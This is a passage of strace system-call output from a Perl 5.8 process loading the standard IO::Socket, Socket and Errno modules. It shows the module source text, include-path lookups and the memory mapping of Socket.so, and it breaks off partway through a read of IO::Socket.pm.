9764  07:29:45.391283 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
9764  07:29:45.391665 stat64("/etc/perl/Socket.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391680 stat64("/etc/perl/Socket.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391694 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391706 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391720 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391733 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391747 stat64("/usr/lib/perl5/Socket.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391759 stat64("/usr/lib/perl5/Socket.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391784 stat64("/usr/share/perl5/Socket.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391825 stat64("/usr/share/perl5/Socket.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391839 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.391887 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
9764  07:29:45.391907 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.391921 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.391932 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.391950 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
9764  07:29:45.392436 brk(0x8239000)    = 0x8239000
9764  07:29:45.392636 read(8, "", 4096) = 0
9764  07:29:45.392652 close(8)          = 0
9764  07:29:45.392737 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
9764  07:29:45.392773 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
9764  07:29:45.392824 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
9764  07:29:45.392855 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
9764  07:29:45.392943 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
9764  07:29:45.392962 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7da1000
9764  07:29:45.392975 mmap2(0xb7da6000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7da6000
9764  07:29:45.392990 close(8)          = 0
9764  07:29:45.393592 brk(0x825a000)    = 0x825a000
9764  07:29:45.393736 stat64("/etc/perl/Errno.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.393753 stat64("/etc/perl/Errno.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.393802 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.393816 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.393847 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.393864 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.393878 stat64("/usr/lib/perl5/Errno.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.393890 stat64("/usr/lib/perl5/Errno.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.393903 stat64("/usr/share/perl5/Errno.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.393915 stat64("/usr/share/perl5/Errno.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.393928 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.393940 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
9764  07:29:45.393961 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.393975 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.393986 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.394006 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
9764  07:29:45.394913 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
9764  07:29:45.395385 _llseek(8, 5966, [5966], SEEK_SET) = 0
9764  07:29:45.395404 _llseek(8, 0, [5966], SEEK_CUR) = 0
9764  07:29:45.395450 close(8)          = 0
9764  07:29:45.396158 brk(0x827b000)    = 0x827b000
9764  07:29:45.396284 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    